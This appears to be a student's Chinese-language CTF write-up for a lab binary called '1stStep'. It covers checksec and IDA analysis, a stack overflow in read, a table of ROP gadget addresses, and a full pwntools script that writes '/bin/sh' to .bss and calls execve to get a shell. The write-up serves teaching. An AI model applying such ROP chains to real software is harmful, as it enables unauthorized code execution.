@@ -1,0 +1,90 @@
+### 1stStep
+
+#### 考点
+
+- ida、ROPgadget工具的使用
+- 多次栈溢出攻击的原理的理解
+- 对汇编语言的理解
+
+#### 解题过程
+
+- 使用`checksec、file`工具查看文件`./1stStep`信息：
+
+![checksec](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\1stStep\images\checksec.png)
+
+![file](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\1stStep\images\file.png)
+
+​		可见`./1stStep`文件为64位程序，启动了DEP保护，使用静态链接。
+
+- 使用`ida`工具打开文件，进行反编译，`main`函数如下，可见main函数内有两个函数banner、vuln，查看两个函数内部逻辑。
+
+  `main`
+
+![main](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\1stStep\images\main.png)
+
+​		`banner`：输出提示信息
+
+![banner](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\1stStep\images\banner.png)
+
+​		`vuln`：接收用户输入，`read`函数存在栈溢出漏洞。
+
+![vuln](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\1stStep\images\vuln.png)
+
+- 经过`ida`静态分析，发现文件内部并没有`system`和`"/bin/sh"`字符串可供利用，因此尝试通过寻找`syscall`函数来执行命令`exceve("/bin/sh", 0, 0)`，`exceve`命令为`0x3d`，`"/bin/sh"`命令可以通过`read`函数传入文件数据存储区域中（`.bss`或`.data`，要求可读可写）。通过`ida`工具获取重要地址，通过`ROPgadget`工具获取`pop rdi, ret`等片段的地址：
+
+| 函数                | 地址               |
+| ------------------- | ------------------ |
+| `main`              | 0x0000000000400AA4 |
+| `vuln`              | 0x0000000000400A6C |
+| `read`              | 0x000000000043FDF0 |
+| `syscall`           | 0x000000000043F435 |
+| `mov rax rdi ; ret` | 0x0000000000417260 |
+| `pop rdi; ret`      | 0x00000000004016e6 |
+| `pop rsi; ret`      | 0x0000000000401807 |
+| `pop rdx; ret`      | 0x00000000004432a6 |
+| `"/bin/sh"`         | 0x00000000006CCC72 |
+| `ret`               | 0x0000000000400AC2 |
+
+- 进行栈溢出攻击的过程：首先在`vuln`函数处制造栈溢出，调用`read`函数将`"/bin/sh"`函数传入文件地址`0x00000000006CCC72`中，`payload1`构造为`b'a' * (0x20 + 8) + ret + pop rdi + 0 + pop rsi + bss_addr + pop rdx + 8 + read + main_addr`，然后继续制造栈溢出，调用`syscall`函数，执行命令，构造`payload2`为`b'a' * (0x20 + 8) + pop_rdi + 0x3b + mov_rax_rdi + pop rdi + "/bin/sh" addr + pop rsi + 0 + pop rdx + 0 + syscall `。
+
+- 构造python脚本，如下，由于未查询到标准的`pop rax ; ret`片段，使用了`mov rax rdi ; ret`片段先赋值给rdi，然后再赋值给rax：
+
+  ```python
+  from pwn import *
+  
+  # 启动进程
+  context(arch='amd64', log_level='debug')
+  p = process('./1stStep')
+  
+  # 设置参数, payload
+  mov_rax_rdi = 0x417260
+  pop_rdi = 0x4016e6
+  pop_rsi = 0x401807
+  pop_rdx = 0x4432a6
+  syscall = 0x43F435
+  bss = 0x6CCC72
+  vul = 0x400A6C
+  read = 0x43FDF0
+  ret = 0x400AC2
+  main_addr = 0x400AA4
+  
+  # 第一次将"/bin/sh"写入内存
+  p.recvuntil("Go explore and exploit here\x1B[0m")
+  payload1 = flat(b'A'*(0x20 + 8), ret, pop_rdi, 0, pop_rsi, bss, pop_rdx, 8, read, main_addr)
+  
+  p.send(payload1)
+  p.send("/bin/sh\x00")
+  
+  # 然后进行ROP攻击
+  p.recvuntil("Go explore and exploit here\x1B[0m")
+  # gdb.attach(p, "b *0x400AA2")
+  payload2 = flat(b'A'*(0x20 + 8), pop_rdi, 0x3b, mov_rax_rdi, pop_rdi, bss, pop_rsi, 0, pop_rdx, 0, syscall)
+  p.send(payload2)
+  p.interactive()
+  ```
+
+#### 结果
+
+成功执行命令，如下图：
+
+![result](C:\SJTU\课程\大四上\信息安全综合实践（2）\练习\1stStep\images\result.png)
